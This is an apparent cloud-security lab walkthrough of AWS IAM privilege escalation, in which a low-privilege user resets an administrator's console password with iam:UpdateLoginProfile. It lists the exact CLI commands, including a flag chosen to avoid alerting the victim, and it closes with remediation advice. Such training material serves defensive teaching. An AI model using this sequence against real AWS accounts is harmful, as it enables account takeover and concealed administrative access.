# Guided Walkthrough: Privilege Escalation via iam:UpdateLoginProfile

This scenario demonstrates a privilege escalation vulnerability where a user has permission to update the login profile (console password) of an administrator user. By using the `iam:UpdateLoginProfile` permission, an attacker can reset the console password of an existing admin user and then log into the AWS Console with full administrative privileges.

This attack is particularly dangerous because it provides console access rather than just API access, enabling the attacker to use the AWS web interface with all its capabilities. Unlike creating access keys, which generates audit trails through API calls, console access can be harder to detect and monitor comprehensively. The attack only works against users who already have a console password (login profile) configured, making existing administrator accounts prime targets.

In real-world environments, this vulnerability often occurs when security teams grant broad IAM permissions for user management without properly scoping them to specific resources or implementing condition-based restrictions. Organizations may inadvertently allow help desk staff or junior administrators to reset passwords for any user, including privileged accounts.

## The Challenge

You start with credentials for `pl-prod-iam-006-to-admin-starting-user` — a low-privilege IAM user whose only notable permission is `iam:UpdateLoginProfile` scoped to `pl-prod-iam-006-to-admin-target-user`. That target user holds `AdministratorAccess` and has an existing console login profile (password).

Your goal is to gain administrative access to the AWS account.

## Reconnaissance

First, confirm who you are:

```bash
aws sts get-caller-identity --query 'Arn' --output text
```

You should see `arn:aws:iam::{account_id}:user/pl-prod-iam-006-to-admin-starting-user`.

Next, verify that the target admin user has an existing login profile — this is a prerequisite for the attack, since `UpdateLoginProfile` updates an existing password rather than creating one from scratch:

```bash
aws iam get-login-profile --user-name pl-prod-iam-006-to-admin-target-user
```

A successful response confirms the login profile exists. You can also confirm the target is an admin by listing their attached policies:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-iam-006-to-admin-target-user \
  --query 'AttachedPolicies[*].PolicyName' \
  --output text
```

You should see `AdministratorAccess` in the output.

Confirm that your starting user does NOT yet have admin access (attempting an admin action should fail):

```bash
aws iam list-users --max-items 1
```

This should return an `AccessDenied` error, confirming you need to escalate.

## Exploitation

With the reconnaissance complete, you know the target user has an existing login profile and holds full admin permissions. All that's left is to reset their password:

```bash
aws iam update-login-profile \
  --user-name pl-prod-iam-006-to-admin-target-user \
  --password 'NewP@ssw0rd123!' \
  --no-password-reset-required
```

The `--no-password-reset-required` flag is important — without it the target user would be forced to change their password on next login, which would reveal the intrusion.

Wait about 15 seconds for IAM changes to propagate, then log into the AWS Console using the target user's username and the new password you just set.

## Verification

To verify the escalation worked, log in to the AWS Console at:

```
https://{account_id}.signin.aws.amazon.com/console
```

Use the username `pl-prod-iam-006-to-admin-target-user` and the password you set. Once logged in you will have full `AdministratorAccess` to the account.

Alternatively, if you want to verify via the CLI rather than the console, you can derive temporary credentials through the console session or simply confirm that the `get-login-profile` call returns an updated `PasswordResetRequired: false` field:

```bash
aws iam get-login-profile --user-name pl-prod-iam-006-to-admin-target-user
```

## What Happened

You exploited an overly broad IAM permission grant. The starting user was permitted to call `iam:UpdateLoginProfile` on the admin target user, which meant they could silently replace that user's console password with one they controlled. From there, a standard console login provided unrestricted administrative access to the entire account.

This path is common in real environments wherever help-desk or IT-operations roles are granted broad user-management permissions without restricting them to non-privileged accounts. The fix is straightforward: scope `iam:UpdateLoginProfile` to non-admin users only, enforce SCPs that block password updates on privileged accounts, and require MFA for any credential-modification action.
